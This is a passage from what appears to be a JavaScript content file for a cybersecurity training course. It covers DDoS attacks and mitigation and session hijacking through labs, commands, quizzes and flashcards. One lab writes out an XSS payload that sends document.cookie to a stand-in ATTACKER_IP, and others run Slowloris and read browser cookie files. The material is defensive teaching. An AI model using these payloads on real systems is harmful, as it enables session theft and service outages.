    scenario: 'GFS security team wants to demonstrate how a low-bandwidth attack can take down a legacy Apache server.',
    objectives: ['Execute a Slowloris attack', 'Observe the effect on the target web server', 'Implement a mitigation'],
    steps: ['Step 1: Start Apache on the target VM.', 'Step 2: Run Slowloris against the target VM IP.', 'Step 3: Attempt to browse to the target VM website from a third machine.', 'Step 4: Install and configure mod_reqtimeout on Apache to mitigate.'],
    evidence: ['Terminal output showing Slowloris sending partial headers', 'Browser timeout error'],
    validation: ['The Apache server should stop responding to legitimate requests while Slowloris is running.'],
    troubleshooting: ['If Apache doesn\'t crash, try increasing the number of sockets Slowloris opens (-s parameter).'],
    mitre: [{ id: 'T1498', name: 'Network Denial of Service', tactic: 'Impact' }],
    cleanup: ['Stop Slowloris and restart Apache.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'Which attack exploits the TCP 3-way handshake?', opts: ['UDP Flood', 'SYN Flood', 'Ping of Death', 'HTTP GET Flood'], correct: 1, fb: 'SYN floods leave connections half-open.' },
    { type: 'true-false', difficulty: 'Intermediate', q: 'Slowloris requires a massive amount of bandwidth to be effective.', opts: ['True', 'False'], correct: 1, fb: 'False. Slowloris is a low-bandwidth attack that exhausts server connection limits.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is the primary target of an HTTP POST attack?', opts: ['Network bandwidth', 'DNS servers', 'Server processing resources (e.g., database, parsing)', 'Router interfaces'], correct: 2, fb: 'POST attacks force the server to process data, consuming CPU and memory.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which protocol is connectionless and easily spoofed in flood attacks?', opts: ['TCP', 'HTTP', 'UDP', 'FTP'], correct: 2, fb: 'UDP does not require a handshake, making source IP spoofing trivial.' },
    { type: 'true-false', difficulty: 'Advanced', q: 'SYN Cookies can help mitigate SYN flood attacks.', opts: ['True', 'False'], correct: 0, fb: 'True. SYN cookies allow the server to avoid allocating resources until the final ACK is received.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'How does Slowloris maintain open connections?', opts: ['By sending huge files', 'By sending partial HTTP headers very slowly', 'By exploiting a buffer overflow', 'By sending TCP keep-alives'], correct: 1, fb: 'It sends incomplete headers periodically to keep the socket open.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'What type of server architecture is most vulnerable to Slowloris?', opts: ['Thread-based (like traditional Apache)', 'Event-driven (like Nginx)', 'Serverless', 'Microservices'], correct: 0, fb: 'Servers that spawn a thread per connection quickly run out of available threads.' },
    { type: 'true-false', difficulty: 'Beginner', q: 'A UDP flood is an example of a volumetric attack.', opts: ['True', 'False'], correct: 0, fb: 'True. UDP floods aim to consume all available bandwidth.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is the "Smurf attack"?', opts: ['An HTTP application attack', 'An ICMP echo request amplification attack directed at a broadcast address', 'A type of SQL injection', 'A botnet propagation method'], correct: 1, fb: 'The Smurf attack uses ICMP echo requests with a spoofed source IP sent to a broadcast network.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'Which of the following is an effective mitigation specifically against HTTP POST floods?', opts: ['Increasing network bandwidth', 'Implementing SYN cookies', 'Web Application Firewall (WAF) rate limiting and inspection', 'Blocking UDP traffic'], correct: 2, fb: 'WAFs can inspect Layer 7 traffic and limit request rates based on behavior.' }
  ],
  flashcards: [
    { f: 'SYN Flood', b: 'An attack that exploits the TCP handshake by leaving connections half-open.' },
    { f: 'Slowloris', b: 'A Layer 7 attack that keeps connections open by sending partial HTTP requests.' }
  ],
  summary: ['SYN floods exhaust connection state tables.', 'UDP floods consume network bandwidth.', 'Slowloris targets web server concurrent connection limits.', 'HTTP POST attacks consume processing power.', 'Different attack vectors require distinct mitigation strategies.'],
  outcomes: ['Describe how a SYN flood works.', 'Explain the mechanics of a Slowloris attack.', 'Identify the differences between UDP and TCP-based attacks.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 60, difficulty: "Advanced", prerequisites: ["Botnets"], lastReviewed: "2026-07-18" }
};

CONTENT['ddos-mitigation'] = {
  eyebrow: 'Module 10 · Topic 4',
  title: 'DDoS Mitigation & Defense',
  module: 'Phase 10: Network Defense Analyst',
  sub: 'Strategies for defending against DDoS attacks, including Anycast, WAFs, rate limiting, and BGP blackholing.',
  objectives: ['Understand Anycast routing', 'Configure WAF rules', 'Implement BGP blackholing'],
  learn: {
    simple: 'Defending against massive DDoS attacks requires a multi-layered approach. Modern mitigation relies heavily on distributing traffic and filtering out malicious requests before they reach the target server. Techniques range from simple rate limiting to complex BGP routing alterations.',
    analogy: 'Mitigating a DDoS attack is like managing a flooded river. You can build higher levees (more bandwidth), divert the water into flood plains (Anycast), or use filters to pull debris out of the water (WAFs).',
    architecture: 'Anycast network architecture distributes incoming traffic across multiple geographically dispersed data centers, absorbing volumetric attacks naturally. Web Application Firewalls (WAFs) inspect Layer 7 traffic to block application-specific attacks like HTTP floods. BGP Remotely Triggered Black Hole (RTBH) routing is an ISP-level mitigation where traffic destined for the targeted IP is dropped entirely, protecting the rest of the network but effectively completing the DoS for that specific IP.',
    why: 'No single enterprise has enough bandwidth to absorb a massive terabit-scale DDoS attack alone. Mitigation requires leveraging cloud-based scrubbing centers and advanced routing techniques to ensure business continuity.'
  },
  enterprise: {
    gfs: 'GFS utilizes a cloud-based DDoS scrubbing service with an Anycast network to protect its primary customer portals from volumetric attacks.',
    windows: 'Windows Server environments utilize dynamic IP restrictions in IIS to automatically block IPs exhibiting abusive request rates.',
    linux: 'Linux firewalls use advanced iptables modules like "hashlimit" or utilize Fail2ban to dynamically rate-limit and ban malicious IP addresses.'
  },
  workflow: ['Step 1: Detect anomaly via monitoring systems.', 'Step 2: Trigger automated mitigation (e.g., local rate limiting).', 'Step 3: If volumetric attack exceeds capacity, initiate failover to a scrubbing center.', 'Step 4: Apply WAF rules for any Layer 7 attack components.', 'Step 5: As a last resort for extreme attacks, initiate BGP blackholing with the ISP.', 'Step 6: Monitor mitigation effectiveness and adjust rules.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="100" y="100" width="400" height="200" fill="#86efac"/><text x="300" y="200" dominant-baseline="middle" text-anchor="middle" font-size="24">DDoS Mitigation Architecture</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT', purpose: 'Rate limit HTTP traffic', out: 'No output (rule added)', note: 'Basic local mitigation for HTTP floods', mistake: 'Setting limits too low and blocking legitimate users' }
    ],
    win: [
      { cmd: 'New-WebConfigurationProperty -pspath "IIS:\\" -filter "system.webServer/security/dynamicIpSecurity/denyByRequestRate" -name "enabled" -value "True"', purpose: 'Enable IIS Dynamic IP Security', out: 'Configuration updated', note: 'Helps protect against Layer 7 DoS on Windows Server', mistake: 'Not testing in a staging environment first' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Advanced',
    duration: '45',
    platform: 'Linux / AWS',
    environment: 'Cloud Lab',
    tools: ['iptables', 'AWS WAF'],
    dependencies: [],
    safety: ['Do not apply aggressive blocking rules to production systems without testing.'],
    scenario: 'GFS requires a demonstration of Layer 7 mitigation using rate limiting and WAF rules.',
    objectives: ['Configure iptables for basic rate limiting', 'Simulate traffic to trigger the limit', 'Review dropped packet logs'],
    steps: ['Step 1: Access the Linux target server.', 'Step 2: Apply an iptables rule to limit incoming ICMP (ping) traffic.', 'Step 3: Ping the server rapidly from an attacker VM.', 'Step 4: Verify that excess pings are dropped.'],
    evidence: ['iptables rules list', 'Attacker terminal showing dropped pings'],
    validation: ['Pings exceeding the defined rate limit should result in packet loss.'],
    troubleshooting: ['If all pings succeed, ensure the default policy or subsequent rules are not overriding your limit rule.'],
    mitre: [{ id: 'M1041', name: 'Filter Network Traffic', tactic: 'Mitigation' }],
    cleanup: ['Flush the iptables rules (iptables -F).']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'What is the purpose of a Web Application Firewall (WAF) in DDoS mitigation?', opts: ['To increase network bandwidth', 'To inspect and filter Layer 7 malicious traffic', 'To route traffic via BGP', 'To provide antivirus scanning'], correct: 1, fb: 'WAFs analyze HTTP/HTTPS traffic to block application-layer attacks.' },
    { type: 'true-false', difficulty: 'Intermediate', q: 'Anycast routing allows multiple servers in different geographic locations to share the same IP address.', opts: ['True', 'False'], correct: 0, fb: 'True. Anycast routes requests to the nearest geographic server, dispersing attack traffic.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What does BGP Blackholing do?', opts: ['Encrypts all traffic', 'Routes all traffic destined for a targeted IP into a "null0" interface (drops it)', 'Redirects traffic to a honeypot', 'Cleans the traffic and sends it back'], correct: 1, fb: 'Blackholing drops all traffic (good and bad) intended for the target to save the broader network.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'What is a "Scrubbing Center"?', opts: ['A facility that physically cleans server hardware', 'A centralized data center where traffic is analyzed and malicious packets are removed', 'An on-premise firewall', 'A software tool for deleting malware'], correct: 1, fb: 'Scrubbing centers ingest raw traffic, filter out the attack, and forward clean traffic to the enterprise.' },
    { type: 'true-false', difficulty: 'Intermediate', q: 'Rate limiting is an effective defense against massive volumetric attacks (e.g., 500 Gbps).', opts: ['True', 'False'], correct: 1, fb: 'False. Local rate limiting cannot save a network connection if the incoming pipe is physically saturated.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which mitigation technique is best suited for a Slowloris attack?', opts: ['BGP Blackholing', 'Anycast', 'Reverse proxy with aggressive connection timeout settings', 'Adding more hard drives'], correct: 2, fb: 'Configuring servers or reverse proxies to drop slow connections mitigates Slowloris.' },
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'What is an SLA in the context of DDoS protection services?', opts: ['Service Level Agreement', 'System Log Analysis', 'Secure Layer Access', 'Standard Logic Architecture'], correct: 0, fb: 'SLAs define the guaranteed response and mitigation times provided by a vendor.' },
    { type: 'true-false', difficulty: 'Advanced', q: 'BGP Flowspec allows for more granular filtering than traditional BGP Blackholing.', opts: ['True', 'False'], correct: 0, fb: 'True. Flowspec can distribute fine-grained filtering rules (like blocking specific ports) rather than just dropping all traffic.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is a Content Delivery Network (CDN) primarily used for, which also helps in DDoS mitigation?', opts: ['Creating botnets', 'Caching content closer to users, thus distributing load', 'Encrypting databases', 'Managing local network switches'], correct: 1, fb: 'CDNs naturally absorb DDoS attacks by serving cached content from distributed edge nodes.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'When configuring iptables for rate limiting, what does the "limit-burst" parameter define?', opts: ['The maximum size of a packet', 'The number of packets allowed before the rate limit kicks in', 'The total duration of the rule', 'The specific port to block'], correct: 1, fb: 'Limit-burst allows an initial burst of packets before enforcing the strict rate limit.' }
  ],
  flashcards: [
    { f: 'Anycast', b: 'A network routing method where multiple machines share the same IP address to distribute traffic load.' },
    { f: 'BGP Blackholing', b: 'A technique to drop all traffic directed at a specific IP address to save the wider network from an attack.' }
  ],
  summary: ['DDoS mitigation requires defense in depth.', 'Anycast disperses traffic globally.', 'WAFs protect against Layer 7 attacks.', 'Scrubbing centers filter malicious volumetric traffic.', 'BGP blackholing is a last resort to protect ISP infrastructure.'],
  outcomes: ['Identify different DDoS mitigation techniques.', 'Understand the role of a WAF.', 'Explain how Anycast helps absorb attacks.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Advanced", prerequisites: ["Attack Techniques"], lastReviewed: "2026-07-18" }
};



// --- INJECTED MODULE 11 CONTENT ---
CONTENT['session-hijacking-concepts'] = {
  "eyebrow": "Module 11 \u00b7 Topic 1",
  "title": "Session Hijacking Concepts",
  "module": "Phase 11: Application Security Analyst",
  "sub": "Understanding the fundamentals of session hijacking and its impact.",
  "objectives": [
    "Define session hijacking and its underlying mechanisms.",
    "Differentiate between active and passive session hijacking.",
    "Understand the typical session hijacking process."
  ],
  "learn": {
    "simple": "Session hijacking, sometimes known as cookie hijacking, is the exploitation of a valid computer session to gain unauthorized access to information or services in a computer system. In particular, it refers to the theft of a magic cookie used to authenticate a user to a remote server.",
    "analogy": "It is like someone stealing your VIP wristband at a concert; they can now access all the restricted areas pretending to be you, without needing to show your ID.",
    "architecture": "The attack typically begins with the attacker monitoring network traffic or exploiting a vulnerability to intercept or predict a session token. Once the attacker possesses a valid session ID, they can inject it into their own HTTP requests. The server, trusting the session ID, grants the attacker the same privileges as the legitimate user. This bypasses the authentication phase entirely.",
    "why": "Session hijacking is critical because it allows attackers to bypass authentication controls, leading to account takeover, data breaches, and unauthorized transactions, all while appearing as a legitimate user."
  },
  "enterprise": {
    "gfs": "At Global Financial Services, an attacker hijacking a trader\'s session could execute unauthorized multi-million dollar trades or access sensitive market strategies.",
    "windows": "In Windows environments, session hijacking can target SMB sessions or RDP connections, potentially leading to lateral movement across the enterprise network.",
    "linux": "In Linux servers, hijacked SSH or administrative web panel sessions can provide root-level access or control over critical infrastructure components."
  },
  "workflow": [
    "Step 1: The legitimate user authenticates to the server.",
    "Step 2: The server issues a session token to the user.",
    "Step 3: The attacker intercepts or predicts the session token.",
    "Step 4: The attacker injects the stolen token into their own browser.",
    "Step 5: The attacker accesses the application masquerading as the user.",
    "Step 6: The attacker performs unauthorized actions."
  ],
  "diagram": {
    "caption": "Click to interact with the diagram",
    "svg": "<svg viewBox=\"0 0 600 400\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"50\" y=\"150\" width=\"100\" height=\"100\" fill=\"#e0e0e0\"/><text x=\"100\" y=\"200\" dominant-baseline=\"middle\" text-anchor=\"middle\">User</text><rect x=\"450\" y=\"150\" width=\"100\" height=\"100\" fill=\"#e0e0e0\"/><text x=\"500\" y=\"200\" dominant-baseline=\"middle\" text-anchor=\"middle\">Server</text><path d=\"M 150 200 L 450 200\" stroke=\"black\" stroke-width=\"2\" marker-end=\"url(#arrow)\"/><text x=\"300\" y=\"190\" text-anchor=\"middle\">Session Token</text><rect x=\"250\" y=\"300\" width=\"100\" height=\"50\" fill=\"#ffcccc\"/><text x=\"300\" y=\"325\" dominant-baseline=\"middle\" text-anchor=\"middle\">Attacker</text><path d=\"M 300 300 L 300 200\" stroke=\"red\" stroke-width=\"2\" stroke-dasharray=\"5,5\"/></svg>"
  },
  "commands": {
    "lin": [
      {
        "cmd": "tcpdump -i eth0 -w traffic.pcap",
        "purpose": "Capture network traffic to look for session cookies.",
        "out": "Packets captured to file",
        "note": "Use filters for specific ports",
        "mistake": "Filling up disk space with unstructured captures"
      }
    ],
    "win": [
      {
        "cmd": "type %userprofile%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
        "purpose": "Attempt to read local cookie files",
        "out": "Database file content",
        "note": "Usually encrypted or locked",
        "mistake": "Assuming plain text storage"
      }
    ]
  },
  "lab": {
    "type": "guided",
    "difficulty": "Intermediate",
    "duration": "45",
    "platform": "Kali Linux",
    "environment": "Local Lab",
    "tools": [
      "Wireshark",
      "Burp Suite"
    ],
    "dependencies": [],
    "safety": [
      "Perform this lab only in an isolated environment."
    ],
    "scenario": "Simulate an insecure login process to intercept a session cookie.",
    "objectives": [
      "Capture unencrypted HTTP traffic.",
      "Extract the session cookie.",
      "Replay the session cookie to gain access."
    ],
    "steps": [
      "Step 1: Start Wireshark and listen on the local interface.",
      "Step 2: Log in to the vulnerable web application.",
      "Step 3: Filter Wireshark traffic for HTTP POST requests.",
      "Step 4: Locate the Set-Cookie header in the response.",
      "Step 5: Use a browser extension to inject the cookie into a new session."
    ],
    "evidence": [
      "Screenshot of the captured cookie in Wireshark.",
      "Screenshot of the hijacked session in the browser."
    ],
    "validation": [
      "You should see the account details of the hijacked user without logging in."
    ],
    "troubleshooting": [
      "If no traffic is captured, check the interface selection in Wireshark."
    ],
    "mitre": [
      {
        "id": "T1539",
        "name": "Steal Web Session Cookie",
        "tactic": "Credential Access"
      }
    ],
    "cleanup": [
      "Close Wireshark and log out of the vulnerable application."
    ]
  },
  "quiz": [
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is the primary goal of session hijacking?",
      "opts": [
        "To guess a user\'s password",
        "To bypass the authentication process by stealing a valid session token",
        "To crash the target server",
        "To encrypt user data for ransom"
      ],
      "correct": 1,
      "fb": "Session hijacking aims to steal a valid session token, allowing the attacker to bypass authentication."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which of the following is NOT a common method of session hijacking?",
      "opts": [
        "Session Fixation",
        "Cross-Site Scripting (XSS)",
        "SQL Injection",
        "Cross-Site Request Forgery (CSRF)"
      ],
      "correct": 2,
      "fb": "SQL Injection is primarily used to interact with a database, not directly for hijacking a session, although it could theoretically be used to steal session tokens stored in a database."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Session hijacking only occurs over unencrypted HTTP connections.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "While HTTP makes interception easier, session hijacking can occur over HTTPS if endpoints are compromised (e.g., via XSS or malware)."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "In passive session hijacking, what does the attacker do?",
      "opts": [
        "Injects traffic into the session",
        "Takes over the session entirely, disconnecting the legitimate user",
        "Monitors and records the session traffic without interfering",
        "Floods the server with session requests"
      ],
      "correct": 2,
      "fb": "Passive hijacking involves monitoring and recording data (like sniffing) without altering the communication flow."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Hard",
      "q": "What distinguishes active session hijacking from passive?",
      "opts": [
        "Active hijacking requires physical access",
        "Active hijacking involves the attacker taking over the session and often silencing the legitimate user",
        "Active hijacking only works on wireless networks",
        "Active hijacking is undetectable"
      ],
      "correct": 1,
      "fb": "Active hijacking involves interacting with the target system, taking control of the session, and often disrupting the legitimate user\'s connection."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which OSI layer does session hijacking primarily target?",
      "opts": [
        "Layer 3 (Network)",
        "Layer 4 (Transport)",
        "Layer 5 (Session)",
        "Layer 7 (Application)"
      ],
      "correct": 2,
      "fb": "Session hijacking primarily targets Layer 5 (Session layer), although it often exploits vulnerabilities at Layer 7 (Application) or Layer 4 (Transport, TCP hijacking)."
    },
    {
      "type": "true-false",
      "difficulty": "Intermediate",
      "q": "Using predictable session IDs makes a web application more secure against hijacking.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "Predictable session IDs make it easy for attackers to guess valid tokens, making the application highly vulnerable."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which mitigation technique helps prevent session hijacking over a network?",
      "opts": [
        "Using Telnet instead of SSH",
        "Implementing IPsec or SSL/TLS for all communications",
        "Disabling firewalls",
        "Using static IP addresses"
      ],
      "correct": 1,
      "fb": "Encrypting the traffic using SSL/TLS or IPsec prevents attackers from sniffing session tokens off the network."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Hard",
      "q": "What is \"Session sniffing\"?",
      "opts": [
        "Guessing session IDs through brute force",
        "Intercepting network traffic to capture session identifiers",
        "Forcing a user to authenticate with a known session ID",
        "Exploiting XSS to steal cookies"
      ],
      "correct": 1,
      "fb": "Session sniffing refers specifically to using packet sniffers to intercept network traffic and extract session tokens."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Why do attackers target session IDs instead of passwords?",
      "opts": [
        "Session IDs are always shorter than passwords",
        "Passwords are never sent over the network",
        "Session IDs bypass the need for multi-factor authentication (MFA)",
        "Session IDs are easier to brute-force"
      ],
      "correct": 2,
      "fb": "Once a user authenticates (even with MFA), the session ID represents that authenticated state. Stealing it bypasses the need to pass MFA checks."
    }
  ],
  "flashcards": [
    {
      "f": "Session Hijacking",
      "b": "The exploitation of a valid computer session to gain unauthorized access to information or services."
    },
    {
      "f": "Session Token",
      "b": "A unique identifier, usually in the form of a cookie, used to track an authenticated user."
    },
    {
      "f": "Active Hijacking",
      "b": "The attacker takes over an existing session, often disconnecting the legitimate user."
    },
    {
      "f": "Passive Hijacking",
      "b": "The attacker monitors network traffic to capture session data without interfering."
    }
  ],
  "summary": [
    "Session hijacking allows attackers to bypass authentication by stealing a valid session token.",
    "It can be active (taking over) or passive (monitoring).",
    "Predictable session IDs are a major vulnerability.",
    "Encryption (HTTPS) is a critical defense against network-based sniffing.",
    "It often targets web applications and TCP sessions."
  ],
  "outcomes": [
    "Explain the concept of session hijacking.",
    "Identify the differences between active and passive hijacking.",
    "Describe the typical steps involved in a session hijacking attack."
  ],
  "meta": {
    "contentVersion": "1.0.0",
    "estimatedTime": 45,
    "difficulty": "Intermediate",
    "prerequisites": [
      "Basic networking",
      "Web application architecture"
    ],
    "lastReviewed": "2026-07-18"
  }
};
CONTENT['application-level-hijacking'] = {
  "eyebrow": "Module 11 \u00b7 Topic 2",
  "title": "Application-Level Session Hijacking",
  "module": "Phase 11: Application Security Analyst",
  "sub": "Exploring techniques used to hijack sessions at the application layer.",
  "objectives": [
    "Understand application-level session hijacking techniques.",
    "Explain Session Fixation and Cross-Site Scripting (XSS) in the context of hijacking.",
    "Identify methods for preventing application-level hijacking."
  ],
  "learn": {
    "simple": "Application-level session hijacking focuses on stealing or manipulating the session tokens (like HTTP cookies) used by web applications to maintain state. Attackers exploit vulnerabilities in the application\'s code or design rather than the underlying network.",
    "analogy": "It is like someone tricking the bouncer into giving you a VIP wristband with a specific number they already know, so they can use a copy of that wristband to enter later.",
    "architecture": "Techniques include Session Sniffing (capturing cookies over unencrypted HTTP), Cross-Site Scripting (injecting malicious JavaScript to read document.cookie), and Session Fixation (forcing the user to authenticate using a session ID predetermined by the attacker). These attacks exploit how browsers and web servers handle session state.",
    "why": "With the vast majority of enterprise services moving to the web, application-level hijacking is one of the most common and critical attack vectors, often leading to immediate account compromise."
  },
  "enterprise": {
    "gfs": "At Global Financial Services, an XSS vulnerability in the customer portal could allow attackers to steal session cookies of high-net-worth clients, leading to unauthorized fund transfers.",
    "windows": "In Windows environments, applications using integrated authentication mechanisms (like NTLM over HTTP) might be targeted if session tokens are mishandled.",
    "linux": "Linux-hosted web applications (LAMP stack) are frequent targets for XSS and Session Fixation if input validation and session management are poorly implemented."
  },
  "workflow": [
    "Step 1: Identify a vulnerability (e.g., XSS) in the target application.",
    "Step 2: Craft a malicious payload designed to steal the session cookie.",
    "Step 3: Deliver the payload to the victim (e.g., via a phishing link).",
    "Step 4: The victim\'s browser executes the payload, sending the cookie to the attacker.",
    "Step 5: The attacker injects the stolen cookie into their browser.",
    "Step 6: The attacker accesses the victim\'s account."
  ],
  "diagram": {
    "caption": "Click to interact with the diagram",
    "svg": "<svg viewBox=\"0 0 600 400\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"50\" y=\"50\" width=\"120\" height=\"80\" fill=\"#e0e0e0\"/><text x=\"110\" y=\"90\" dominant-baseline=\"middle\" text-anchor=\"middle\">Attacker</text><rect x=\"400\" y=\"50\" width=\"120\" height=\"80\" fill=\"#e0e0e0\"/><text x=\"460\" y=\"90\" dominant-baseline=\"middle\" text-anchor=\"middle\">Victim</text><rect x=\"225\" y=\"250\" width=\"120\" height=\"80\" fill=\"#e0e0e0\"/><text x=\"285\" y=\"290\" dominant-baseline=\"middle\" text-anchor=\"middle\">Web Server</text><path d=\"M 170 90 L 400 90\" stroke=\"red\" stroke-width=\"2\" marker-end=\"url(#arrow)\"/><text x=\"285\" y=\"80\" text-anchor=\"middle\" font-size=\"12\">1. Sends malicious link (XSS)</text><path d=\"M 460 130 L 320 250\" stroke=\"black\" stroke-width=\"2\" marker-end=\"url(#arrow)\"/><text x=\"400\" y=\"200\" text-anchor=\"middle\" font-size=\"12\">2. Clicks link, logs in</text><path d=\"M 460 90 Q 285 -20 110 50\" stroke=\"red\" stroke-width=\"2\" stroke-dasharray=\"5,5\" marker-end=\"url(#arrow)\" fill=\"none\"/><text x=\"285\" y=\"10\" text-anchor=\"middle\" font-size=\"12\">3. Payload sends cookie to attacker</text></svg>"
  },
  "commands": {
    "lin": [
      {
        "cmd": "curl -I http://example.com | grep Set-Cookie",
        "purpose": "Inspect how session cookies are set.",
        "out": "Cookie attributes (HttpOnly, Secure)",
        "note": "Check for missing security flags",
        "mistake": "Ignoring the Secure flag on HTTPS sites"
      }
    ],
    "win": [
      {
        "cmd": "Invoke-WebRequest -Uri http://example.com -SessionVariable session; $session.Cookies.GetCookies(\"http://example.com\")",
        "purpose": "Extract cookies using PowerShell",
        "out": "Cookie details",
        "note": "Useful for scripting API interactions",
        "mistake": "Not handling redirects properly"
      }
    ]
  },
  "lab": {
    "type": "guided",
    "difficulty": "Intermediate",
    "duration": "45",
    "platform": "Kali Linux",
    "environment": "Local Lab",
    "tools": [
      "Burp Suite",
      "Firefox"
    ],
    "dependencies": [],
    "safety": [
      "Perform this lab only in an isolated environment."
    ],
    "scenario": "Exploit a reflected XSS vulnerability to steal a session cookie.",
    "objectives": [
      "Identify an XSS vulnerability.",
      "Craft a payload to steal the cookie.",
      "Hijack the session using the stolen cookie."
    ],
    "steps": [
      "Step 1: Navigate to the vulnerable search page.",
      "Step 2: Inject a test payload: `<script>alert(1)\x3C/script>`.",
      "Step 3: Host a simple listener on your attacker machine (`python3 -m http.server 80`).",
      "Step 4: Inject the payload: `<script>fetch(\"http://ATTACKER_IP/?cookie=\" + document.cookie)\x3C/script>`.",
      "Step 5: View the captured cookie in the Python server logs.",
      "Step 6: Use Burp Suite to replace your session cookie with the stolen one."
    ],
    "evidence": [
      "Screenshot of the Python server log showing the cookie.",
      "Screenshot of the hijacked account."
    ],
    "validation": [
      "You should successfully access the victim account without credentials."
    ],
    "troubleshooting": [
      "If the cookie is not sent, ensure the application is not using the HttpOnly flag."
    ],
    "mitre": [
      {
        "id": "T1185",
        "name": "Browser Session Hijacking",
        "tactic": "Collection"
      }
    ],
    "cleanup": [
      "Close the Python server and clear browser cookies."
    ]
  },
  "quiz": [
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which attack involves forcing a user to authenticate with a predetermined session ID?",
      "opts": [
        "Session Sniffing",
        "Cross-Site Scripting (XSS)",
        "Session Fixation",
        "Cross-Site Request Forgery (CSRF)"
      ],
      "correct": 2,
      "fb": "In Session Fixation, the attacker provides a valid session ID to the victim, waits for them to log in, and then uses that same ID to access the account."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which cookie attribute prevents client-side scripts (like JavaScript) from accessing the cookie?",
      "opts": [
        "Secure",
        "HttpOnly",
        "SameSite",
        "Path"
      ],
      "correct": 1,
      "fb": "The HttpOnly flag instructs the browser not to allow client-side scripts to access the cookie, mitigating XSS-based cookie theft."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What does the \"Secure\" flag on a cookie enforce?",
      "opts": [
        "The cookie can only be transmitted over encrypted (HTTPS) connections.",
        "The cookie is encrypted at rest.",
        "The cookie cannot be read by JavaScript.",
        "The cookie never expires."
      ],
      "correct": 0,
      "fb": "The Secure flag ensures the browser only sends the cookie over HTTPS, preventing session sniffing over unencrypted networks."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Hard",
      "q": "How does Cross-Site Scripting (XSS) facilitate session hijacking?",
      "opts": [
        "By crashing the web server",
        "By injecting malicious scripts that read document.cookie and send it to the attacker",
        "By brute-forcing the session ID",
        "By redirecting DNS requests"
      ],
      "correct": 1,
      "fb": "XSS allows attackers to execute JavaScript in the victim\'s browser, which can read the session cookie (if HttpOnly is not set) and exfiltrate it."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Session fixation requires the attacker to predict the next session ID.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. In session fixation, the attacker does not need to predict the ID; they *set* the ID for the victim before authentication."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which of the following is the best defense against Session Fixation?",
      "opts": [
        "Setting the HttpOnly flag",
        "Regenerating the session ID upon successful login",
        "Using long session timeouts",
        "Encrypting the database"
      ],
      "correct": 1,
      "fb": "Regenerating the session ID when the user logs in ensures that any pre-existing session ID (potentially fixed by an attacker) becomes invalid."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is a \"predictable session token\"?",
      "opts": [
        "A token generated using a strong cryptographic RNG",
        "A token that follows a recognizable pattern, such as sequential numbers or encoded timestamps",
        "A token stored in an encrypted database",
        "A token that changes on every request"
      ],
      "correct": 1,
      "fb": "Predictable tokens use weak generation algorithms (like MD5 of the username or sequential numbers), allowing attackers to guess valid tokens."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Hard",
      "q": "In the context of session hijacking, what does CRIME/BEAST attack target?",
      "opts": [
        "SQL Databases",
        "SSL/TLS encryption to recover session cookies",
        "DNS Servers",
        "ARP Tables"
      ],
      "correct": 1,
      "fb": "Attacks like CRIME and BEAST exploit vulnerabilities in SSL/TLS implementations to decrypt encrypted traffic and recover session cookies."
    },
    {
      "type": "true-false",
      "difficulty": "Intermediate",
      "q": "The SameSite cookie attribute helps protect against Cross-Site Request Forgery (CSRF), which is related to session manipulation.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 0,
      "fb": "True. SameSite prevents the browser from sending cookies along with cross-site requests, mitigating CSRF."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "If an attacker steals a session cookie that does NOT have the Secure flag, how might they have obtained it?",
      "opts": [
        "By exploiting an XSS vulnerability",
        "By sniffing unencrypted HTTP traffic on a public Wi-Fi network",
        "By guessing the token",
        "Both A and B are possible"
      ],
      "correct": 3,
